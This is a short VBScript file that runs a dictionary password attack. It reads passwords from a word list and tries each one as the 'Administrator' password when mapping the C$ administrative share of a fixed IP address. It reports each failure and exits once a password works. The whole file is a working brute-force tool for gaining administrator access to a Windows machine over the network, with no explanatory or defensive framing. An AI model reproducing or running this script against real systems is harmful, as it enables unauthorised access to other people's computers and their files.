Option Explicit

const ForReading = 1
Dim sFileName, oFSO, oInputFile
Dim strComputer, strPassword
Dim oNet

On Error Resume Next
set oNet = CreateObject("WScript.Network")
sFileName = "dict.txt"
strComputer = "10.0.0.124"
set oFSO = CreateObject("Scripting.FileSystemObject")
set oInputFile = oFSO.OpenTextFile("c:\" & sFileName, ForReading)
Do Until oInputFile.AtEndOfStream
    strPassword = oInputFile.Readline
    oNet.RemoveNetworkDrive "X:"
	If Err.Number <> 0 Then Err.Clear
	oNet.MapNetworkDrive "X:", "\\" & strComputer & "\C$",, "Administrator", strPassword
	If Err.Number <> 0 Then
	    WScript.Echo "Failed to map drive as Administrator, password of " & strPassword
	    Err.Clear
	Else
	    WScript.Echo "SUCCESS!  Mapped drive with password of " & strPassword
	    WScript.Quit
	End If
Loop
     

